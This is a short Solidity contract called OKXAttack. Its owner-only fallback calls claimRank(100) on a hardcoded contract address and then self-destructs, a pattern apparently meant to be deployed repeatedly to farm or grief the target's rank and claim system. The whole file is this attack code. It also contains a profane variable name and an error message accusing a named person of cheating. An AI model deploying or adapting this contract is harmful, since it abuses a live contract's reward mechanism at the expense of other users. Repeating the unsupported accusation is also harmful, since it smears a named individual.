// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract OKXAttack{
    address private owner;
    address public target;
    constructor() {
        owner = msg.sender;
        target = 0x06450dEe7FD2Fb8E39061434BAbCFC05599a6Fb8;
    }

    fallback() external payable{
        uint256 term = 100;
        require(msg.sender == owner,"owner only");
        (bool fucked,) = target.call(abi.encodeWithSignature("claimRank(uint256)", term));
        require(fucked, "Mingxing Xu is still cheating");
        selfdestruct(payable(owner));
    }
}